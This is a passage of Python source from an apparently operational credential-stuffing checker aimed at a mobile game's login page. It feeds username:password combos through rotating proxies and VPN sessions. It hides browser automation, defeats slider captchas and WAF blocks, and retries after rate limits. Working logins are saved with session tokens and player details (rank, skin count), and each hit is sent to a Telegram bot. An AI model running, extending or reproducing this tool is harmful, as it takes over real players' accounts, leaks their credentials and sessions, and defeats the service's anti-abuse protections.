    pool             = proxy_pool or ([base_proxy_info] if base_proxy_info else [])
    pool_idx         = (wid + wave_idx * 7) % max(len(pool), 1)
    cur_proxy_info   = pool[pool_idx] if pool else None
    rot_user_info    = None
    worker_epoch     = 0
    ctx_vpn_epoch    = 0
    slider_cleared   = False
    ctx_counted      = False
    _acct_retries    = acct_retries if acct_retries is not None else {}

    async def _cleanup_page(p, close_page: bool = False):
        if p is None:
            return
        for attr in ('_net_cdp', '_touch_cdp'):
            cdp_s = getattr(p, attr, None)
            if cdp_s is not None:
                try:
                    await asyncio.wait_for(cdp_s.detach(), timeout=2.0)
                except Exception:
                    pass
                setattr(p, attr, None)
        try:
            await asyncio.wait_for(p.unroute_all(behavior='ignoreErrors'), timeout=2.0)
        except Exception:
            pass
        if close_page:
            try:
                await asyncio.wait_for(p.close(), timeout=2.0)
            except Exception:
                pass

    async def _close_ctx():
        nonlocal ctx, page, page2, slider_cleared, ctx_counted
        try:
            for p in (page2, page):
                await _cleanup_page(p, close_page=False)
            if ctx:
                try:
                    await asyncio.wait_for(ctx.close(), timeout=5.0)
                except Exception:
                    pass
        finally:
            ctx = page = page2 = None
            slider_cleared = False
            if ctx_counted and browser_state is not None:
                ctx_counted = False
                browser_state['active'] = max(0, browser_state['active'] - 1)
                if browser_state['active'] == 0:
                    browser_state['zero_evt'].set()

    async def _attach_page(p):
        try:
            cdp_net = await ctx.new_cdp_session(p)
            p._net_cdp = cdp_net
            await cdp_net.send("Network.enable")
            _live_reqs = set()
            def _on_resp_rx(params):
                # Only count real remote network traffic (ignore RAM route.fulfill hits where remoteIPAddress is empty)
                if params.get('response', {}).get('remoteIPAddress'):
                    rid = params.get('requestId')
                    if rid:
                        _live_reqs.add(rid)
            def _on_load_done(params):
                rid = params.get('requestId')
                if rid in _live_reqs:
                    _live_reqs.discard(rid)
                    stats['bytes_used'] += params.get('encodedDataLength', 0) + 450
            def _on_load_fail(params):
                rid = params.get('requestId')
                if rid:
                    _live_reqs.discard(rid)
            cdp_net.on("Network.responseReceived", _on_resp_rx)
            cdp_net.on("Network.loadingFinished", _on_load_done)
            cdp_net.on("Network.loadingFailed", _on_load_fail)
        except Exception:
            pass
        await p.route(_ROUTE_RE, _route_filter)
        p.set_default_timeout(12000)
        await p.goto(LOGIN_PAGE, wait_until="domcontentloaded", timeout=10000)

    async def open_context_and_page(max_attempts: int = 4, rotate_ip: bool = False) -> bool:
        """Buka context baru pada sticky proxy + navigasi ke login page."""
        nonlocal worker_epoch, ctx_vpn_epoch, ctx, page, page2, rot_user_info, cur_proxy_info, pool_idx, slider_cleared, ctx_counted, cur_browser
        if wave_limit and stats['checked'] >= wave_limit:
            return False
        if rotate_ip:
            worker_epoch += 1
        await _close_ctx()

        if vpn_coord is not None:
            if vpn_coord.ovpn_failed:
                return False
            if not vpn_coord.gate.is_set():
                t_vpn_lk = time.monotonic()
                try:
                    await asyncio.wait_for(vpn_coord.gate.wait(), timeout=320.0)
                except asyncio.TimeoutError:
                    return False
                _PERF.record_stall('lock', time.monotonic() - t_vpn_lk)
                if vpn_coord.ovpn_failed:
                    return False
            if NUM_CONTEXTS >= 6 and wid > 0 and (ctx_vpn_epoch != vpn_coord.epoch or stats['proxy_ctx'] < NUM_CONTEXTS):
                await asyncio.sleep(min(3.5, (wid % 16) * 0.22))

        _recycle_chk = max(500, NUM_CONTEXTS * 45)
        if browser_state is not None:
            if not browser_state['gate'].is_set():
                t_lk = time.monotonic()
                try:
                    await asyncio.wait_for(browser_state['gate'].wait(), timeout=35.0)
                except asyncio.TimeoutError:
                    return False
                _PERF.record_stall('lock', time.monotonic() - t_lk)
            elif (
                ensure_browser
                and not browser_state['recycling']
                and (browser_state.get('force_recycle') or (stats['checked'] - browser_state.get('born_chk', 0)) >= _recycle_chk)
                and (not wave_limit or stats['checked'] < wave_limit - 15)
            ):
                browser_state['recycling'] = True
                browser_state['gate'].clear()
                t_lk = time.monotonic()
                try:
                    await asyncio.wait_for(browser_state['zero_evt'].wait(), timeout=8.0)
                except Exception:
                    pass
                _PERF.record_stall('lock', time.monotonic() - t_lk)
                did_recycle = False
                try:
                    if browser_state['active'] == 0:
                        dbg("Periodic Chromium recycle (clean memory/speed reset)...")
                        new_b = await ensure_browser(force_relaunch=True)
                        cur_browser = new_b
                        did_recycle = True
                except Exception:
                    pass
                finally:
                    if did_recycle:
                        browser_state['born_ctx'] = stats['proxy_ctx']
                        browser_state['born_chk'] = stats['checked']
                        browser_state['force_recycle'] = False
                    browser_state['recycling'] = False
                    browser_state['gate'].set()
                    _PERF.resume()

        for attempt in range(1, max_attempts + 1):
            if wave_limit and stats['checked'] >= wave_limit:
                return False
            if attempt > 1:
                worker_epoch += 1
            if vpn_coord is not None:
                await vpn_coord.ensure_ovpn_alive(browser_state, stats)
                if vpn_coord.ovpn_failed:
                    return False
            rot_user_info = None
            if pool:
                picked = None
                for _ in range(len(pool)):
                    pool_idx = (pool_idx + 1) % len(pool)
                    cand = pool[pool_idx]
                    pk = (cand.get('server', ''), cand.get('username', ''))
                    if _PROXY_FAILS.get(pk, 0) < 3:
                        picked = cand
                        break
                if picked is None:
                    _PROXY_FAILS.clear()
                    pool_idx = (pool_idx + 1) % len(pool)
                    picked = pool[pool_idx]
                cur_proxy_info = picked
            b = None
            try:
                if browser_state is not None and not browser_state['gate'].is_set():
                    try:
                        await asyncio.wait_for(browser_state['gate'].wait(), timeout=45.0)
                    except asyncio.TimeoutError:
                        continue
                if browser_state is not None and not ctx_counted:
                    ctx_counted = True
                    browser_state['active'] += 1
                    browser_state['zero_evt'].clear()
                b = await ensure_browser() if ensure_browser else cur_browser
                try:
                    if hasattr(b, 'is_connected') and not b.is_connected() and ensure_browser:
                        b = await ensure_browser(force_relaunch=True, stale_browser=b)
                except Exception:
                    if ensure_browser:
                        b = await ensure_browser(force_relaunch=True, stale_browser=b)
                cur_browser = b

                ctx_opts = {'has_touch': True}
                if cur_proxy_info and cur_proxy_info.get('username'):
                    rot_user_info = await rotated_user_async(
                        cur_proxy_info['username'],
                        cur_proxy_info.get('server', ''),
                        session_id=f"{_RUN_SALT}w{wid}v{wave_idx}e{worker_epoch}a{attempt}"
                    )
                    proxy_conf = {
                        'server':   cur_proxy_info['server'],
                        'username': rot_user_info['user'],
                        'password': cur_proxy_info.get('password', ''),
                    }
                    if not _TUI_ACTIVE: p_out(f"  [{now()[11:]}] w{wid} context proxy: {safe_proxy_str(proxy_conf)}...")
                    ctx_opts['proxy'] = proxy_conf
                elif cur_proxy_info:
                    ctx_opts['proxy'] = cur_proxy_info

                t_ctx0 = time.monotonic()
                _ctx_task = asyncio.create_task(b.new_context(**ctx_opts))
                try:
                    ctx = await asyncio.wait_for(_ctx_task, timeout=12.0)
                except asyncio.TimeoutError:
                    def _cleanup_leaked_ctx(fut):
                        try:
                            leaked = fut.result()
                            if leaked is not None:
                                asyncio.create_task(leaked.close())
                        except BaseException:
                            pass
                    if _ctx_task.done():
                        _cleanup_leaked_ctx(_ctx_task)
                    else:
                        _ctx_task.add_done_callback(_cleanup_leaked_ctx)
                    raise
                stealth_js = (
                    "try { Object.defineProperty(navigator, 'webdriver', { get: () => undefined }); } catch(_) {}"
                    if _USING_STEALTH_PATCH else ""
                )
                await ctx.add_init_script(
                    "(() => { " + stealth_js + " const addS = () => { if (document.getElementById('__cb_ob_css')) return; "
                    "const tgt = document.head || document.documentElement; if (!tgt) return; "
                    "const s = document.createElement('style'); s.id = '__cb_ob_css'; "
                    "s.textContent = 'html, body { overscroll-behavior-x: none !important; overscroll-behavior: none !important; }'; "
                    "tgt.appendChild(s); }; addS(); if (!document.head) document.addEventListener('DOMContentLoaded', addS, {once:true}); })()"
                )
                stats['proxy_ctx'] += 1
                ctx_vpn_epoch = vpn_coord.epoch if vpn_coord else 0
                page = await ctx.new_page()
                await _attach_page(page)
                _ctx_dt = time.monotonic() - t_ctx0
                if _ctx_dt >= 4.0:
                    _PERF.record_stall('proxy', _ctx_dt)
                    if cur_proxy_info and _ctx_dt >= 8.0:
                        pk = (cur_proxy_info.get('server', ''), cur_proxy_info.get('username', ''))
                        _PROXY_FAILS[pk] = _PROXY_FAILS.get(pk, 0) + 1
                return True
            except Exception as e:
                err_s = str(e)
                err_low = err_s.lower()
                is_browser_dead = ('err_' not in err_low and 'net::' not in err_low) and any(
                    k in err_low for k in ('browser has been closed', 'browser closed', 'connection closed', 'target page, context or browser has been closed')
                )
                if is_browser_dead and b is not None:
                    try:
                        if hasattr(b, 'is_connected') and b.is_connected():
                            is_browser_dead = False
                    except Exception:
                        pass
                if ensure_browser and is_browser_dead:
                    await _close_ctx()
                    if browser_state is not None:
                        browser_state['gate'].clear()
                        try:
                            await asyncio.wait_for(browser_state['zero_evt'].wait(), timeout=5.0)
                        except Exception:
                            pass
                    try:
                        cur_browser = await ensure_browser(force_relaunch=True, stale_browser=b)
                    except Exception:
                        pass
                    finally:
                        if browser_state is not None:
                            browser_state['gate'].set()
                elif cur_proxy_info:
                    pk = (cur_proxy_info.get('server', ''), cur_proxy_info.get('username', ''))
                    _PROXY_FAILS[pk] = _PROXY_FAILS.get(pk, 0) + 1
                if ('ERR_TUNNEL_CONNECTION_FAILED' in err_s or 'ERR_PROXY_CONNECTION_FAILED' in err_s) and rot_user_info:
                    bad_reg = rot_user_info.get('region', '').lower()
                    if bad_reg and bad_reg not in ('proxy', 'direct'):
                        async with _get_rotation_lock():
                            _TUNNEL_BLACKLIST.add(bad_reg)
                        dbg(f"w{wid} region [{bad_reg.upper()}] di-blacklist")
                dbg(f"w{wid} open_ctx attempt {attempt}/{max_attempts}: {err_s[:70]}")
                await _close_ctx()
                if attempt == max_attempts:
                    if not _TUI_ACTIVE: p_out(f"{c(RED)}[!] w{wid} exhausted {max_attempts} proxy attempts{W}")
                    return False
                await asyncio.sleep(random.uniform(0.3, 0.8))
        return False

    async def ensure_slider_cleared() -> bool:
        """Pastikan slider Aliyun diselesaikan sekali per context, lalu buka Tab 2 pipelining."""
        nonlocal slider_cleared, page2
        if slider_cleared:
            return True
        try:
            await page.wait_for_selector('input[type="password"], #aliyunCaptcha-sliding-slider, .btn_slide, #waf_nc_block', timeout=4500)
        except Exception:
            pass
        try:
            await page.wait_for_selector('input[type="password"]', timeout=400)
        except Exception:
            if not await solve_waf(page, ctx):
                return False
            try:
                await page.wait_for_selector('input[type="password"]', timeout=3500)
            except Exception:
                return False

        try:
            has_slider = await page.evaluate("""() => {
                const v = el => !!(el && el.getBoundingClientRect().width > 0 && getComputedStyle(el).display !== 'none' && getComputedStyle(el).visibility !== 'hidden');
                const s = document.getElementById('aliyunCaptcha-sliding-slider') || document.querySelector('.btn_slide') || document.querySelector('[id*="sliding-slider"]');
                const b = document.getElementById('waf_nc_block') || document.getElementById('WAF_NC_WRAPPER');
                return v(s) || v(b);
            }""")
            if has_slider and not await solve_waf(page, ctx):
                return False
        except Exception:
            return False

        slider_cleared = True
        return True

    async def _lookup_player_valid(dec_d: dict):
        global _lookup_exec
        guid = dec_d.get('guid', '')
        sess = dec_d.get('session', '')
        guid_int = int(guid) if str(guid).isdigit() else 0
        if not (INFO_OK and guid_int and sess and dm):
            return None
        try:
            if _lookup_exec is None:
                from concurrent.futures import ThreadPoolExecutor
                _lookup_exec = ThreadPoolExecutor(max_workers=4, thread_name_prefix="mlbb_info")
            loop = asyncio.get_running_loop()
            _tlk = time.monotonic()
            _res_info = await asyncio.wait_for(
                loop.run_in_executor(_lookup_exec, get_player_info, guid_int, sess, dm, 5),
                timeout=15.0,
            )
            _PERF.record_stall('lookup', time.monotonic() - _tlk)
            return _res_info
        except Exception as ie:
            dbg(f"w{wid} lookup err ({guid_int}): {ie}")
            return None

    async def handle_result(kind: str, res_data: dict, user: str, passw: str, dec_d: dict, info_res=None) -> str | None:
        iso_time = now()
        if kind == 'VALID':
            guid = dec_d.get('guid', '')
            sess = dec_d.get('session', '')
            name = dec_d.get('name', '')
            bi_i = info_res.get('data', {}).get('basic_info', {}) if info_res and info_res.get('status') == 'success' else {}
            gi_i = info_res.get('data', {}).get('game_info', {}) if info_res and info_res.get('status') == 'success' else {}
            gid_s = f"{bi_i.get('player_id')}({bi_i.get('server')})" if bi_i.get('player_id') and bi_i.get('player_id') != 'Unknown' else ''
            extra_tag = f"|ID:{gid_s}|Skin:{bi_i.get('skin_count', 0)}|Rank:{gi_i.get('current_rank', 'Unknown')}" if gid_s else ""
            append_line(FILES['VALID'], f"{user}:{passw}|{sess}|{guid}|{name}|{iso_time}{extra_tag}")
            stats['valid'] += 1
            print_hit(user, passw, dec_d, info_res)
            extra_tg = f"\nID: <code>{esc_html(gid_s)}</code> · Skin: {bi_i.get('skin_count', 0)} · {esc_html(gi_i.get('current_rank', ''))}" if gid_s else ""
            return (
                f"✅ <b>VALID</b>\n"
                f"<code>{esc_html(user)}:{esc_html(passw)}</code>\n"
                f"Session: <code>{esc_html(sess)}</code>\n"
                f"GUID: {esc_html(guid)} · {esc_html(name)}{extra_tg}"
            )
        elif kind == 'OTP':
            _raw_data = res_data.get('data')
            masked_email = (
                dec_d.get('email') or res_data.get('email')
                or (_raw_data if isinstance(_raw_data, str) and '@' in _raw_data else None)
                or (_raw_data.get('email') if isinstance(_raw_data, dict) else None)
                or '?'
            )
            append_line(FILES['OTP'], f"{user}:{passw}|{masked_email}|{iso_time}")
            stats['otp'] += 1
            print_result('OTP', user, passw, f"Email: {masked_email}")
            return f"🔑 <b>2FA / OTP</b>\n<code>{esc_html(user)}:{esc_html(passw)}</code>\nEmail: {esc_html(masked_email)}"
        elif kind == 'INVALID':
            append_line(FILES['INVALID'], f"{user}:{passw}|{iso_time}")
            stats['invalid'] += 1
            print_result('INVALID', user, passw, res_data.get('message', 'Wrong pass'))
            return None
        else:
            why = res_data.get('message', kind)
            append_line(FILES['ERR'], f"{user}:{passw}|{why}|{iso_time}")
            stats['error'] += 1
            print_result('ERR', user, passw, why)
            return None

    async def _clear_otp_form(p):
        try:
            if LOGIN_PAGE.split('?', 1)[0] not in (p.url or ''):
                await p.goto(LOGIN_PAGE, wait_until="domcontentloaded", timeout=12000)
                return
            await p.evaluate("""() => {
                let el = document.querySelector('.content-but');
                while (el) {
                    if (el.__vue__ && el.__vue__.setemailvalue) {
                        el.__vue__.setemailvalue(''); el.__vue__.setpasswordvalue(''); break;
                    }
                    el = el.parentElement;
                }
            }""")
        except Exception:
            pass

    async def _open_ready_ctx(max_tries: int = 3, rotate_ip: bool = False) -> bool:
        for t in range(max_tries):
            if wave_limit and stats['checked'] >= wave_limit:
                return False
            if vpn_coord and vpn_coord.ovpn_failed:
                return False
            seen_ep = vpn_coord.epoch if vpn_coord else 0
            try:
                if await open_context_and_page(rotate_ip=(rotate_ip or t > 0)):
                    if await ensure_slider_cleared():
                        return True
                    if vpn_coord and t >= (max_tries - 1):
                        stats['waf'] += 1
                        await vpn_coord.on_waf_or_rate(seen_ep, 'init_slider', browser_state, stats)
            except Exception:
                if vpn_coord and vpn_coord.ovpn_failed:
                    raise
            if vpn_coord and vpn_coord.ovpn_failed:
                return False
            await _close_ctx()
            await asyncio.sleep(0.5 * (t + 1))
        return False

    ctx_cond = asyncio.Condition()
    waf_lock = asyncio.Lock()
    ctx_gen = 0
    ctx_accts = 0
    inflight_tabs = 0
    recovering = False
    tab0_done = False
    ACCOUNTS_PER_CTX = 120  # ponytail: reuse solved session longer to cut ~230KB/ctx cloudauth+captcha cost; raise/lower if WAF rate shifts

    async def _recover_ctx(local_gen: int, reason: str):
        nonlocal ctx_gen, ctx_accts, slider_cleared, recovering, page2
        t_rec = time.monotonic()
        async with ctx_cond:
            while recovering:
                await ctx_cond.wait()
            # Another tab already rotated/refreshed this context; skip duplicate work
            if local_gen != ctx_gen:
                _PERF.record_stall('lock', time.monotonic() - t_rec)
                return page is not None
            ctx_gen += 1
            recovering = True
            still_busy = False
            if inflight_tabs > 0:
                try:
                    await asyncio.wait_for(ctx_cond.wait_for(lambda: inflight_tabs == 0), timeout=45.0)
                except Exception:
                    still_busy = inflight_tabs > 0
        _PERF.record_stall('lock', time.monotonic() - t_rec)
        try:
            if reason != 'waf_refresh' or still_busy:
                ctx_accts = 0
            if reason == 'waf_refresh' and not still_busy and page is not None:
                try:
                    await page.goto(LOGIN_PAGE, wait_until="domcontentloaded", timeout=12000)
                    slider_cleared = False
                    if await ensure_slider_cleared():
                        if page2 is not None:
                            try:
                                await page2.goto(LOGIN_PAGE, wait_until="domcontentloaded", timeout=12000)
                            except Exception:
                                await _cleanup_page(page2, close_page=True)
                                page2 = None
                        return True
                except Exception:
                    pass
            return await _open_ready_ctx(max_tries=3, rotate_ip=True)
        finally:
            async with ctx_cond:
                recovering = False
                ctx_cond.notify_all()

    async def _tab_loop(tab_idx: int):
        nonlocal page2, ctx_accts, inflight_tabs, tab0_done, cur_browser, ctx_gen, recovering
        p2_miss = 0
        try:
          while True:
            if wave_limit and stats['checked'] >= wave_limit:
                break
            if wid >= _PERF.target_workers:
                close_idle = False
                async with ctx_cond:
                    if wid >= _PERF.target_workers and inflight_tabs == 0 and not recovering and ctx is not None:
                        recovering = True
                        close_idle = True
                if close_idle:
                    try:
                        await _close_ctx()
                    finally:
                        async with ctx_cond:
                            recovering = False
                            ctx_cond.notify_all()
                ok_slot = await _PERF.wait_for_slot(
                    wid,
                    lambda: (combo_q.pending <= 0) or bool(wave_limit and stats['checked'] >= wave_limit) or bool(vpn_coord and vpn_coord.ovpn_failed),
                )
                if not ok_slot:
                    break
                if wid > 0 and _PERF.target_workers >= 4:
                    await asyncio.sleep(min(0.8, (wid % 8) * 0.08))
                continue
            try:
                u, pw = combo_q.get_nowait()
            except asyncio.QueueEmpty:
                break

            done_item = False
            requeued = False
            try:
                while True:
                    if vpn_coord is not None:
                        await vpn_coord.ensure_ovpn_alive(browser_state, stats)
                    need_recover_gen = None
                    p_tab = None
                    can_create_p2 = False
                    my_gen = ctx_gen
                    async with ctx_cond:
                        while recovering:
                            await ctx_cond.wait()
                        if page is None or ctx is None or (vpn_coord is not None and ctx_vpn_epoch != vpn_coord.epoch):
                            need_recover_gen = ctx_gen
                        else:
                            p_tab = page if tab_idx == 0 else page2
                            if p_tab is not None:
                                my_gen = ctx_gen
                                inflight_tabs += 1
                            elif tab_idx == 1 and slider_cleared and (ctx_accts >= 1 or tab0_done) and not (wave_limit and stats['checked'] >= wave_limit):
                                can_create_p2 = True
                                my_gen = ctx_gen
                                inflight_tabs += 1

                    if need_recover_gen is not None:
                        if wave_limit and stats['checked'] >= wave_limit:
                            combo_q.put_nowait((u, pw))
                            requeued = True
                            combo_q.task_done()
                            done_item = True
                            break
                        ok_ctx = await _recover_ctx(need_recover_gen, 'rotate')
                        if not ok_ctx:
                            if wave_limit and stats['checked'] >= wave_limit:
                                combo_q.put_nowait((u, pw))
                                requeued = True
                                combo_q.task_done()
                                done_item = True
                                break
                            raise RuntimeError(f"w{wid}_ctx_recovery_failed")
                        continue

                    if p_tab is None:
                        if can_create_p2:
                            new_p2 = None
                            try:
                                if ctx is not None and my_gen == ctx_gen:
                                    new_p2 = await ctx.new_page()
                                    await _attach_page(new_p2)
                                    if my_gen == ctx_gen and ctx is not None:
                                        page2 = new_p2
                                        p2_miss = 0
                                        new_p2 = None
                            except Exception:
                                page2 = None
                            finally:
                                if new_p2 is not None:
                                    await _cleanup_page(new_p2, close_page=True)
                                async with ctx_cond:
                                    inflight_tabs = max(0, inflight_tabs - 1)
                                    ctx_cond.notify_all()
                            if page2 is not None:
                                continue
                        if wave_limit and stats['checked'] >= wave_limit:
                            combo_q.put_nowait((u, pw))
                            requeued = True
                            combo_q.task_done()
                            done_item = True
                            break
                        if tab_idx == 1 and ctx is not None and slider_cleared and ctx_accts < 1 and not tab0_done:
                            await asyncio.sleep(0.3)
                            continue
                        p2_miss += 1
                        if p2_miss > 10:
                            combo_q.put_nowait((u, pw))
                            requeued = True
                            combo_q.task_done()
                            done_item = True
                            stuck_gen = ctx_gen
                            async with ctx_cond:
                                try:
                                    await asyncio.wait_for(
                                        ctx_cond.wait_for(
                                            lambda: tab0_done or ctx_gen != stuck_gen or (wave_limit and stats['checked'] >= wave_limit)
                                        ),
                                        timeout=15.0,
                                    )
                                except asyncio.TimeoutError:
                                    pass
                            p2_miss = 0
                            if tab0_done or (wave_limit and stats['checked'] >= wave_limit):
                                return
                            break
                        await asyncio.sleep(0.5)
                        continue

                    p2_miss = 0
                    t_try = time.monotonic()
                    seen_vpn_ep = vpn_coord.epoch if vpn_coord else 0
                    try:
                        if vpn_coord and vpn_coord.ovpn_failed:
                            raise RuntimeError("OpenVPN rotation failed - stopping worker to protect IP")
                        kind, res_data = await do_login_via_browser(p_tab, ctx, u, pw, wid, waf_lock=waf_lock)
                    except Exception as ex:
                        kind, res_data = 'ERR', {'message': str(ex)[:60]}
                    finally:
                        async with ctx_cond:
                            inflight_tabs = max(0, inflight_tabs - 1)
                            ctx_cond.notify_all()

                    err_msg = str(res_data.get('message', ''))

                    if kind in ('VALID', 'INVALID', 'OTP', 'UNKNOWN'):
                        if kind in ('VALID', 'OTP'):
                            await _clear_otp_form(p_tab)
                            if vpn_coord and kind in ('VALID', 'OTP', 'INVALID'):
                                vpn_coord.record_ok()
                        elif vpn_coord and kind == 'INVALID':
                            vpn_coord.record_ok()
                        dec_d = res_data.get('decrypted_data', {})
                        info_res = await _lookup_player_valid(dec_d) if kind == 'VALID' else None
                        _acct_retries.pop(_norm_combo_key(u, pw), None)
                        if my_gen == ctx_gen:
                            ctx_accts += 1
                        if cur_proxy_info:
                            pk = (cur_proxy_info.get('server', ''), cur_proxy_info.get('username', ''))
                            if _PROXY_FAILS.get(pk, 0) > 0:
                                _PROXY_FAILS[pk] = _PROXY_FAILS[pk] - 1
                        stats['checked'] += 1
                        _PERF.mark_check()
                        _PERF.on_outcome('OK', time.monotonic() - t_try)
                        try:
                            tg_msg = await handle_result(kind, res_data, u, pw, dec_d, info_res=info_res)
                        except Exception as he:
                            dbg(f"w{wid} handle_result err: {he}")
                            tg_msg = None
                        combo_q.task_done()
                        done_item = True
                        print_progress()
                        if tg_msg:
                            await send_tg(tg_msg)
                        if not (wave_limit and stats['checked'] >= wave_limit):
                            if vpn_coord and vpn_coord.should_rotate_proactive(stats['checked']) and vpn_coord.epoch == seen_vpn_ep:
                                pre_vpn_gen = ctx_gen
                                if await vpn_coord.coordinate('proactive', seen_vpn_ep, browser_state, stats):
                                    await _recover_ctx(pre_vpn_gen, 'rotate')
                            elif ctx_accts >= ACCOUNTS_PER_CTX or (browser_state is not None and (browser_state['recycling'] or browser_state.get('force_recycle'))):
                                await _recover_ctx(my_gen, 'periodic_rotate')
                        break

                    # Do NOT burn account retries if another tab rotated/refreshed context OR VPN rotation is active/completed mid-flight
                    if vpn_coord and vpn_coord.ovpn_failed:
                        raise RuntimeError("OpenVPN rotation failed - stopping worker to protect IP")
                    if my_gen != ctx_gen or (vpn_coord and (vpn_coord.rotating or vpn_coord.epoch != seen_vpn_ep)):
                        if vpn_coord and not vpn_coord.gate.is_set():
                            try:
                                await asyncio.wait_for(vpn_coord.gate.wait(), timeout=320.0)
                            except asyncio.TimeoutError:
                                pass
                        if vpn_coord and vpn_coord.ovpn_failed:
                            raise RuntimeError("OpenVPN rotation failed - stopping worker to protect IP")
                        if my_gen == ctx_gen:
                            await _recover_ctx(my_gen, 'rotate')
                        await asyncio.sleep(0.1)
                        continue

                    err_low = err_msg.lower()
                    if any(k in err_low for k in ('cloakbrowser', 'license key', 'session limit', 'browser has been closed', 'browser closed', 'connection closed', 'target page, context or browser has been closed')) and ('net::' not in err_low and 'err_' not in err_low):
                        is_lic = any(k in err_low for k in ('cloakbrowser', 'license key', 'session limit'))
                        b_dead = is_lic or (cur_browser is None)
                        if not b_dead:
                            try:
                                b_dead = not cur_browser.is_connected()
                            except Exception:
                                b_dead = True
                        if b_dead:
                            activate_cloak_license()
                            if 'session limit' in err_low:
                                await asyncio.sleep(15.0)
                            if ensure_browser:
                                async with ctx_cond:
                                    while recovering:
                                        await ctx_cond.wait()
                                    if my_gen == ctx_gen:
                                        recovering = True
                                        ctx_gen += 1
                                        do_relaunch = True
                                    else:
                                        do_relaunch = False
                                if do_relaunch:
                                    try:
                                        await _close_ctx()
                                        if browser_state is not None:
                                            browser_state['gate'].clear()
                                            try:
                                                await asyncio.wait_for(browser_state['zero_evt'].wait(), timeout=5.0)
                                            except Exception:
                                                pass
                                        try:
                                            cur_browser = await ensure_browser(force_relaunch=True, stale_browser=cur_browser)
                                        finally:
                                            if browser_state is not None:
                                                browser_state['gate'].set()
                                        if await _open_ready_ctx(max_tries=3, rotate_ip=True):
                                            continue
                                    finally:
                                        async with ctx_cond:
                                            recovering = False
                                            ctx_cond.notify_all()
                                else:
                                    continue
                            raise RuntimeError(f"w{wid}_browser_license_restart")
                        if not await _recover_ctx(my_gen, 'rotate'):
                            raise RuntimeError(f"w{wid}_ctx_recovery_failed")
                        continue

                    if wave_limit and stats['checked'] >= wave_limit:
                        combo_q.put_nowait((u, pw))
                        requeued = True
                        combo_q.task_done()
                        done_item = True
                        break

                    if res_data.get('proxy_407') and cur_proxy_info:
                        pk = (cur_proxy_info.get('server', ''), cur_proxy_info.get('username', ''))
                        _PROXY_FAILS[pk] = _PROXY_FAILS.get(pk, 0) + 3
                        _maybe_rotate_vpnpool_slot(cur_proxy_info)

                    k_id = _norm_combo_key(u, pw)
                    _acct_retries[k_id] = _acct_retries.get(k_id, 0) + 1
                    _out_kind = 'WAF' if kind in ('WAF', 'RATE') else ('TMO' if err_msg == 'timeout_waiting_response' else 'NET')
                    if _acct_retries[k_id] == 1:
                        _PERF.on_outcome(_out_kind, time.monotonic() - t_try)
                    # ponytail: don't double-count full t_try when WAF/proxy wait already recorded its seconds
                    if kind != 'WAF' and err_msg not in ('timeout_waiting_response', 'PROXY_HTTP_ERR', '407_TRAFFIC_EXHAUSTED'):
                        _PERF.record_stall('retry', max(0.5, time.monotonic() - t_try))
                    if _acct_retries[k_id] > 4:
                        _acct_retries.pop(k_id, None)
                        stats['checked'] += 1
                        _PERF.mark_check()
                        try:
                            await handle_result('ERR', {'message': err_msg or f'{kind}_exhausted'}, u, pw, {})
                        except Exception as he:
                            dbg(f"w{wid} handle_result(ERR) err: {he}")
                        combo_q.task_done()
                        done_item = True
                        print_progress()
                        if vpn_coord and (kind in ('WAF', 'RATE') or err_msg == 'timeout_waiting_response'):
                            await vpn_coord.on_waf_or_rate(seen_vpn_ep, kind or err_msg, browser_state, stats)
                        if kind in ('WAF', 'RATE') or res_data.get('proxy_407') or err_msg in ('PROXY_HTTP_ERR', 'timeout_waiting_response') or any(k in err_msg for k in ('TUNNEL', 'PROXY', 'CONNECTION_FAILED')):
                            try:
                                await _recover_ctx(my_gen, 'rotate')
                            except Exception:
                                pass
                        break

                    if kind == 'WAF':
                        stats['waf'] += 1
                        if cur_proxy_info and (ctx_accts >= 3 or _acct_retries[k_id] >= 2):
                            pk = (cur_proxy_info.get('server', ''), cur_proxy_info.get('username', ''))
                            _PROXY_FAILS[pk] = _PROXY_FAILS.get(pk, 0) + 1
                            if _PROXY_FAILS[pk] >= 3:
                                _maybe_rotate_vpnpool_slot(cur_proxy_info)
                        did_vpn = (await vpn_coord.on_waf_or_rate(seen_vpn_ep, 'WAF', browser_state, stats)) if (vpn_coord and _acct_retries[k_id] in (1, 3)) else False
                        waf_mode = 'rotate' if (did_vpn or ctx_accts >= 4 or _acct_retries[k_id] >= 2) else 'waf_refresh'
                        if not await _recover_ctx(my_gen, waf_mode):
                            raise RuntimeError(f"w{wid}_waf_recovery_failed")
                    elif kind == 'RATE' or res_data.get('proxy_407') or any(k in err_msg for k in ('TUNNEL', 'PROXY', 'CONNECTION_FAILED', 'Connection closed', 'Target closed')) or err_msg == 'timeout_waiting_response':
                        if vpn_coord and (kind == 'RATE' or err_msg == 'timeout_waiting_response'):
                            await vpn_coord.on_waf_or_rate(seen_vpn_ep, kind or err_msg, browser_state, stats)
                        if cur_proxy_info and not res_data.get('proxy_407'):
                            pk = (cur_proxy_info.get('server', ''), cur_proxy_info.get('username', ''))
                            _PROXY_FAILS[pk] = _PROXY_FAILS.get(pk, 0) + 1
                            if _PROXY_FAILS[pk] >= 3:
                                _maybe_rotate_vpnpool_slot(cur_proxy_info)
                        if not await _recover_ctx(my_gen, 'rotate'):
                            raise RuntimeError(f"w{wid}_rate_recovery_failed")
                    else:
                        if vpn_coord and any(k in err_low for k in ('timeout', 'timed_out', 'not_loaded', 'err_', 'reset', 'refused', 'aborted')):
                            await vpn_coord.on_waf_or_rate(seen_vpn_ep, err_msg[:20] or 'net_err', browser_state, stats)
                        err_mode = 'rotate' if _acct_retries[k_id] >= 2 else 'waf_refresh'
                        if not await _recover_ctx(my_gen, err_mode):
                            raise RuntimeError(f"w{wid}_err_recovery_failed")
            except BaseException:
                if not done_item and not requeued:
                    try:
                        combo_q.put_nowait((u, pw))
                    except Exception:
                        pass
                    try:
                        combo_q.task_done()
                    except Exception:
                        pass
                raise
        finally:
          if tab_idx == 0:
            async with ctx_cond:
                tab0_done = True
                ctx_cond.notify_all()

    tab_tasks = []
    try:
        if not await _open_ready_ctx(max_tries=3):
            if not _TUI_ACTIVE: p_out(f"{c(RED)}[!] Worker {wid} gagal startup, mencoba restart...{W}")
            if combo_q.pending > 0:
                raise RuntimeError(f"w{wid}_startup_failed")
            return
        tab_tasks = [asyncio.create_task(_tab_loop(0))] + ([asyncio.create_task(_tab_loop(1))] if TWO_TAB else [])
        # Run Tab 0 and Tab 1 independently without waiting for the slower tab in each pair
        await asyncio.gather(*tab_tasks)
    except asyncio.CancelledError:
        for t in tab_tasks:
            if not t.done():
                t.cancel()
